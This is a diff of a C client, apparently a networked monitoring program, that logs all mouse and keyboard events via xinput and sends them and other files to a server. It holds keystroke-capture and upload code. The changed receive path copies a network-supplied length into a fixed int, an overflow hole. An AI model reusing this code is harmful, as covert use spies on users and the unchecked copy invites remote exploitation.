@@ -17,24 +17,26 @@
 #define TMP_IMAGE "image.png"
 #define TMP_OPERATION "event.txt"
 #define TMP_PROCESSING "log.txt"
+#define MAX_LENGTH 256
 
-char time_wait[BUFF_SIZE];
+int time_wait;
 // Make message from opcode, length, payload to send to server
-char *makeMessage(int opcode, int length, char* payload)
+int *makeMessage(int opcode, int length, int* payload)
 {
-    char* message = malloc(BUFF_SIZE+5);
-    bzero(message, BUFF_SIZE+5);
-    sprintf(message, "%d%04d", opcode, length);
-    memcpy(message+5, payload, length);
+    int* message = malloc((MAX_LENGTH+2)*sizeof(int));
+    bzero(message, (MAX_LENGTH+2)*4);
+    message[0] = opcode;
+    message[1] = length;
+    memcpy(message+2, payload, length);
     return message; 
 }
 
 int sendFile(int opcode, char* filename, int client_sock)
 {
 	int lSize, bytes_sent, byte_read;
-    char buff[BUFF_SIZE];
-    char *mess;
-    int i;
+    int buff[MAX_LENGTH];
+    int *mess;
+    int i, len;
 
 	FILE *fp = fopen(filename, "rb");
 	if (fp == NULL) {
@@ -45,7 +47,7 @@ int sendFile(int opcode, char* filename, int client_sock)
 	fseek (fp , 0 , SEEK_END);
 	lSize = ftell (fp);
 	rewind (fp);
-	bzero(buff, BUFF_SIZE);
+	bzero(buff, MAX_LENGTH);
 	while(lSize > 0) {
 		if (lSize > BUFF_SIZE) {
 			byte_read = fread (buff,1,BUFF_SIZE,fp);
@@ -56,7 +58,8 @@ int sendFile(int opcode, char* filename, int client_sock)
 		}
 		// Sent message with opcode = 0: Send all infomation of client's computer
 		mess = makeMessage(opcode, byte_read, buff);
-		bytes_sent = send(client_sock, mess, BUFF_SIZE+5, 0);
+		len = (MAX_LENGTH + 2)* 4;
+		bytes_sent = send(client_sock, mess, len, 0);
 		free(mess);
 		if(bytes_sent <= 0){
 			printf("Error: Connection closed.\n");
@@ -64,9 +67,9 @@ int sendFile(int opcode, char* filename, int client_sock)
 		}
 		lSize -= byte_read;
 		if (lSize <=0) {
-			mess = makeMessage(opcode, 0, "");
+			mess = makeMessage(opcode, 0, buff);
 			// Sent message with opcode = 0: Send all infomation of client's computer
-			bytes_sent = send(client_sock, mess, 5, 0);
+			bytes_sent = send(client_sock, mess, len, 0);
 			free(mess);
 			if(bytes_sent <= 0){
 				printf("Error: Connection closed.\n");
@@ -82,7 +85,7 @@ int sendFile(int opcode, char* filename, int client_sock)
 int sendAll(int client_sock)
 {
 	char command[BUFF_SIZE];
-	sprintf(command,"xinput --test-xi2 --root > %s & sleep %s ; kill $!", TMP_OPERATION, time_wait);
+	sprintf(command,"xinput --test-xi2 --root > %s & sleep %d ; kill $!", TMP_OPERATION, time_wait);
     system(command);
     if (sendFile(2, TMP_OPERATION, client_sock) != 0) {
     	fprintf(stderr, "Sending mouse and keyboard operations is wrong.\n");
@@ -110,17 +113,10 @@ int sendAll(int client_sock)
     return 0;
 }
 
-int parseMess(char *str, int *opcode, int *length, char *payload) {
-    char temp_str[5];
-    memcpy(temp_str, str, 1);
-    temp_str[1] = '\0';
-    *opcode = atoi(temp_str);
-
-    memcpy(temp_str, str+1, 4);
-    temp_str[4] = '\0';
-    *length = atoi(temp_str);
-
-    memcpy(payload, str+5, *length);
+int parseMess(int *mess, int *opcode, int *length, int *payload) {
+    *opcode = mess[0];
+    *length = mess[1];
+    memcpy(payload, mess+2, *length);
     return 0;
 }
 
@@ -128,13 +124,13 @@ int rcvTime(int client_sock)
 {
 	int bytes_received;
 	int opcode, length;
-	char payload[BUFF_SIZE];
-	char buff[BUFF_SIZE+5];
-	bytes_received = recv(client_sock, buff, BUFF_SIZE+5, MSG_DONTWAIT);
+	int payload[MAX_LENGTH];
+	int buff[MAX_LENGTH+2];
+	int len = (MAX_LENGTH + 2) * 4;
+	bytes_received = recv(client_sock, buff, len, MSG_DONTWAIT);
 	if (bytes_received > 0) {
 		parseMess(buff, &opcode, &length, payload);
-		memcpy(time_wait, payload, length);
-		time_wait[length] = 0;
+		memcpy(&time_wait, payload, length);
 	}
     return 0;
 }
